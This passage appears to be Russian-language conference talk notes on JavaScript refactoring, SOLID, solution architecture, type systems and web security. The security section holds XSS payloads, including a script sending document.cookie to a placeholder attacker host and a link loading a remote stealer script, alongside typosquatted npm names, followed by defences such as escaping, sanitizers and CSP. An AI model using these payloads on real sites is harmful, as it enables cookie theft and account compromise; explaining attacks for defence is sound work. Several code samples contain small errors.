  todos.forEach(function (todo, index) {
    todo.id = index;
  });

  todoStorage.uid = todos.length;

  return todos;
}
```

Какой следующий шаг?
Все-таки нужно подключить к серверу

А как же тесты?! (видел на конфе)

1. Данные прочитаны из localStorage
2. Всем данным выставлен правильный id
3. Записан правильный UID

```js
async function fetch(offset, limit) {
  // var todos = JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]");

// Ассинхронность же
  // var todos = api.fetch(`/api/tasks?offset=${offset}&limit=${limit}`)
  var todos = await api.getTasks(offset, limit)

  // todos.forEach(function (todo, index) {
  //   todo.id = index;
  // });
  todos.forEach(/*Кастомный обработчик*/)

  // todoStorage.uid = todos.length;
  todoStorage.uid = /*другой способ получения*/

  return todos;
}
```

Как вы думаете, что станет с тестами?

(тесты падают)

Нужен рефакторинг

или...

### SOLID

#### S

Класс должен иметь только одну причину для изменения
(Какие на йух классы?!)

До

```js
function addAndMultiply(x, y, z) {
  return (x + y) * z;
}
```

После

```js
function add(x1, x2) {
  return x1 + x2;
}
function multiply(x1, x2) {
  return x1 * x2;
}
function addAndMultiply(x1, x2, x3) {
  return multiple(add(x1 + x2), x3);
}

function multiplyAndAdd(x1, x2, x3) {
  return add(multiple(x1, x2), x3);
}
```

Принципы тоже нужно применять лениво

```js
async function fetch(offset, limit) {
  var todos = await getTasks(offset, limit); // Получить задачи

  // var todos = await api.getTasks(offset, limit)
  // todos.forEach(/*Кастомный обработчик*/)

  setStorageHash(todoStorage, todos); // Обновить хеш, для вью

  // todoStorage.uid = /*другой способ получения*/

  return todos;
}
```

Нужно протестировать

- Функции вызвались в нужном порядке (пока забьем)
- Мы правильно получили данные (в отдельной функции)
- Мы правильно посчитали хэш (в отдельной фунции)

Типизация для наглядности

```ts
async function fetch(offset: Number, limit: Number): Promise<Array<ToDo>> {
  var todos: Array<ToDo> = await getTasks(offset, limit);

  setStorageHash(todoStorage, todos);

  return todos;
}
```

Меньше тестов будет с типизацией

#### O

открыто для расширения, но закрыто для изменения

```ts
async function fetch(offset: Number, limit: Number): Promise<Array<ToDo>> {
  var todos: Array<ToDo> = await getTasks(offset, limit);

  // function setStorageHash(taks: Array<ToDo>, todoStorage: TodoStorage) {
  //   todoStorage.uid = task.length;
  // }

  function setStorageHashByLength(items: Array, storage: Storage) {
    storage.uid = items.length;
  }

  setStorageHashByLength(todoStorage, todos);

  return todos;
}
```

#### I

Принцип разделения интерфейса

Клиенты не должны зависеть от методов, которые они не используют

Загружаем что-то еще

```ts
// Нужно еще что-то грузить, переименуем в fetchTasks
async function fetchTasks(offset: Number, limit: Number): Promise<Array<ToDo>> {
  var todos: Array<ToDo> = await getTasks(offset, limit);

  setStorageHash(todoStorage, todos);

  return todos;
}

// Нужно еще для Users
async function fetchUsers(offset: Number, limit: Number): Promise<Array<User>> {
  var users: Array<User> = await getUsers(offset, limit);

  setStorageHash(usersStorage, users);

  return users;
}
```

<!-- НАДО -->

```ts
async function fetch(offset: Number, limit: Number): Promise<Array<any>> {
  var items: Array<any> = await getUsers(offset, limit);

  setStorageHash(usersStorage, users);

  return users;
}
```

#### D

Принцип инверсии зависимостей
(android - берем любой android телефон и не замечаем, что заменили телефон)

Модули верхних уровней не должны зависеть от модулей нижних уровней. Оба типа модулей должны зависеть от абстракций.

Абстракции не должны зависеть от деталей.
Детали должны зависеть от абстракций

```ts
// async function fetch(offset: Number, limit: Number): Promise<Array<any>> {
//   var items: Array<any> = await getUsers(offset, limit);
//   setStorageHash(usersStorage, users);
//   return users;
// }

// =============================

// interface Fetcher {
//   fetch(offset: Number, limit: Number): Promise;
// }

// class UserFetcher implements Fetcher {
//   fetch(offset: Number, limit: Number) {
//     /*...*/
//   }
// }
// class TaskFetcher implements Fetcher {
//   /*...*/
// }

// async function fetch(/*...*/ storage: Storage, fetcher: Fetcher) /*...*/ {
//   var items: Array<any> = await fetcher.fetch(offset, limit);
//   setStorageHash(storage, users);
//   return users;
// }

// =========================

async function fetch(/*...*/ storage: Storage, fetcher: Fetcher) /*...*/ {
  var items: Array<any> = await fetcher.fetch(offset, limit);
  setStorageHash(storage, users);
  return users;
}

async function fetchUsersFromServer(
  offset: Number,
  limit: Number
): Promise<Array<any>> {
  /*...*/
}
async function fetchTasksFromServer(
  offset: Number,
  limit: Number
): Promise<Array<any>> {
  /*...*/
}

function setStorageHash(/*...*/) {
  /*...*/
}
```

Функции == Dependency injection в ООП

Чтобы писать DRY, нужно писать SOLID
(4 из 5 - S O I D) L - не для js

Vue.js - дураки?
Они выполняют Бизнес

От фреймворка ничего не зависит!

---

## Solution architecture и JavaScript

[https://www.youtube.com/watch?v=UVRi9LoFyfI](https://www.youtube.com/watch?v=UVRi9LoFyfI)

### Stakeholders

Заинтересованные стороны

Определить заинтерисованные стороны

### Goals

Цели

Определение бизнес целей.

Использование технологий - это не цели бизнеса

### Constains

Ограничения

Технические
Бюджетные
По людям

### Quality Attributes

Полезные атрибыты

Знание где и как будет пользоваться приложение и ожидания

Люди в лесу должны открывать сайт за 3 сек

### Architecture

#### FE Perfomance Tactics

- Impove User Experience (не помогу в нашем ТЗ)
- Optimize Resources (js, css, images, fonts, etc)
- Caching
- Critical Path (не помогу в нашем ТЗ)
- Compression
- HTTP/2

#### Fault Tolerance

Отказоустойчивость

#### Summary

Validation
Service
Discovery
Circuit Breaker
Leaky Bucket
|
Validation
Logger Service
Discovery

### Choice of technology

#### Architectural Kata is ...

- Provide improvements for current digital platform
- 400 consumer static websites
- High Cost and Long Time to Market for Upgrades
- Expensive content management workflows
- Drupal

#### Solution

MERN + redis + redux
or
Drupal
or
Other Solution?

#### Define Goals

Business Driver
Удовлетворить заказчика

Как?

Business Golas
Оптимизировать затраты

Мы можем ...

Objectives
Уменьшить время выхода на рынок на X%

Уменьшить время на content management на X%

#### Define Constrains

(новые детали)

- Can`t say goodbye to Drupal
- ReactJS and VueJS is used in the company

#### Define Quality Attributes

- Maintainability
- Testability
- Re-usability
- Performance
- Accessibility

#### Design - C4

visit - web site
ingeneer - add themes/components
content - add/edit Content Hub

#### Technology Solution

Template Service -> Nuxt/Next (for static)

db -> github (md)

`We need JAM stack!`

---

## Безопасность: уязвимости вашего приложения

[https://www.youtube.com/watch?v=2gthjl2Lks4&list=PL8sJahqnzh8LOnV0s72DBt0OFBqdv9I9Y&index=3](https://www.youtube.com/watch?v=2gthjl2Lks4&list=PL8sJahqnzh8LOnV0s72DBt0OFBqdv9I9Y&index=3)

### XSS (Cross Site Scripting)

#### Reflected XSS (активный)

Кидают ссылку

`http://forum.by?search`=news<\script%20src="http://hackersite.com/stealer.js

(spam - social networks, short links, qr codes)

Больше социальная инженирия

#### Persistent XSS (пасивный)

Оставляют комментарий вида

```html
<html>
  <script>
    window.location = "http://attacker/?cookie" + document.cookie;
  </script>
</html>
```

Нужно более грубокое знание работы сайтов.
Как рендерится страница, как работает скрипт

Находим уезвимости сайта -> выполням скрипт -> готово

#### Dom-based XSS

<input value="userInput">

добавим в инпут`"><script>...</script>` - готово
получим
<input value="`"><script>...</script>`

Или (сложнее)

добавим в инпут `"><iframe SRC="javascript:alert('XSS')"></iframe>`
получим
<input value=""><iframe SRC="javascript:alert('XSS')"></iframe>

Или с картинкой

добавим в инпут `"><img src=i onerror=alert('xss')>`
получим
<input value=""><img src=i onerror=alert('xss')>

Или заенкодить скрипт
<IMG SRC=&#106;&#106;&#106;&#106;&#106;&#106;&#106;&#106;&#106;&#106;&#106;>

Или так
<IMG SRC=&#0000106;&#0000106;&#0000106;&#0000106;&#0000106;&#0000106;&#0000106;&#0000106;&#0000041>

JS BUG

#### Что можно (обычно) воровать?

Cookie (ls, ss)
Keylogging (passwords)
Phishing (fake forms)
Mining

#### Кто должен нас спастись?

frameworks (react, angular, vue)

AngularJS
usemap (поправлено после 1.5)

Vue.js (v-html)
не помогает - сам разработчик должен отслеживать! Оо

React | Angular
Уязвимости в node_modules

Уязвимости Redux
SSR

```js
<script>
  const state = ${JSON.stringify(preloadedState)}
  window.__PRELOADED_STATE__= state;
</script>
```

Если удаться зарегистрироваться с именем

```json
{
  "user": "Alex</script><script>alert('XSS!')</script>"
}
```

Будет серверный пре-рендеринг и выполняется скрипт злоумышленника

```js
<script>
  const state = "{"user":"Alex
  </script>
 <script>alert(\"XSS!\")</script>
 ...
 </script>
```

#### Старые сайты и использую уязвимости

#### Похожие названия пакетов npm

- FAKE
  ORIGINAL

- babelcli
  babel-cli
- jquery.js
  jquery
- mongose
  mongoose
- gruntcli
  grunt-cli
- D3.js
  D3

в post-install будут украденны переменные среды (env)

#### DATA IS ENEMY

#### NPM IS ENEMY

#### SSR IS ENEMY

#### PROGRESS IS ENEMY

#### SPA IS ENEMY

#### CACHE IS ENEMY (PWA)

#### SW IS ENEMY

В gif может быть зашит SW (WAT???)

ForeignFetch

```json
'Content-Type': "image/gif"
'Origin-Trial': 'AgIMasf+ffwrS9'
'Link': '</sw.js>; rel="serviceworker";'
```

Для майнинга (3 версии хрома работало)

#### EXTENSION IS ENEMY

(ublock, abp, ghost)

XV - XML Viewer
Отслеживает все!

### Как бороться?

Detect Extensions

chrome-extension://{extension ID}/resource

манифест
{extension ID = sfasgdgsdgds...}/

{web_accessible_resources = adblock.custom.css}

Никогда не вставляйте код от пользователь (скрипты, комменты, тэги, аттрибуты, стили)

или сделать проверку перед добавлением

- & --> &amp;
- < --> &lt;
- > --> &gt;
- " --> &quot;
- ' --> &#x27;

и sanitize HTML
use library js-xss or DOMPurify of serialize-javascript

CSP
Content-Security-Policy: script-src https://example.net
Грузит только с 1 домена

CSP nonce
Content-Security-Policy: script-src 'nonce-Xsafasvesaf'

CSP hash
Content-Security-Policy: script-src 'sha256=safasfsaf'

CSP report
Content-Security-Policy: report-uri https://ex.com/csp/report

Other headers

- httpOnly
- X-XSS-Protection
- X-Frame-Options
- X-Content-Type-Options
- X-Webkit-CSP
- others

#### tools

Динамическая проверка
Tools for Jenkins

Owasp ZAP + ZAP Plugin + Any Report Plugin

Arachni + Text Finder Plugin + Any Report Plugin

Статическая проверка
ESLint + eslint-plugin-security

NSP
run npm install nsp
run nsp check

or

Snyk (больше находит и втроен в lighthouse и github)
run npm install snyk
run snyk test

### Summary

- Не полагайтесь на фреймворки
- Заботьтесь о пользователях
- Смотрите на node_modules
- Используйте Content-Security-Policy
- Используйти тулы для динамического анализа
- Используйти тулы для статического анализа

---

## Системы типов в двух словах

[https://www.youtube.com/watch?v=nFtO6419A5k](https://www.youtube.com/watch?v=nFtO6419A5k)

Примитивные типы
like boolean, number etc

### лямбда(l)-исчисления

- x, y, a-z - переменная
- M, N, A-Z - терм (выражения)
- lx.M - абстракция (анонимная функция)
- (M N) - применение (вызов функции)

(lx . x) z -> z
(lx. x) (lx. x) -> (lx. x)

identity function

```js
function identity(x) {
  return x;
}
```

Типов изначально в лямбде не было

Simply-Typed Lamda
(lx: Bool . x): Bool

```ts
function identity(x: number): number {
  return x;
}
```

(lx:Int y:Int . x \* y): Int

```ts
function mult(x: number, y: number): number {
  return x * y;
}
```

Полиморфизм
(Ad-hoc и Параметрический)

Ad-hoc

```js
function saySomething(cat: Cat) {
  return "Meow";
}
function saySomething(dog: Dog) {
  return "Woof";
}

> saySomething(cat);
"Meow"

> saySomething(dog);
"Woof"
```

Параметрический

```ts
function identity<T>(arg: T): T {
  return arg;
}
```

System F
Абстракция на типах

lX. lx x
id = lX. lx:X. x

lx:Bool. x

Дженерики в Go

```go
var x []int
// intSum has type func([]int) int
intSum := Sum(int)
total := intSum(x)
```

Soundness

- Прогресс
- Сохранение типов

Прогресс

`(lx:Int y:Int . x * y) a b`
Если a и b это Int

Сохранение типов

`(lx:Int y:Int . x * y) a b`
->
a \* b

Типы зависят от типов

```h
function List(ty: Type): Type {
  return Array<ty>
}
function list<T>(x: T): List(T) {
  return [x]
}
```

Типы зависят от значений

```js
function random(n: Nat): Fin<n> {
  return ...;
}
```

Верификация ПО
Не будет ошибок, только при разработки.

CompCert и Project Everest

SLTC -> Elm, TypeScript, ReasonML, Java -> Haskell -> Coq, Agda Idris

- Сабтайпинг
- Линейные типы (Rust)
- Сессионные типы
- HoTT

С чего начать?

- Type-Driven Developments with Idris

---

## Архитектурные паттерны

[https://addyosmani.com/resources/essentialjsdesignpatterns/book/](https://addyosmani.com/resources/essentialjsdesignpatterns/book/)

---
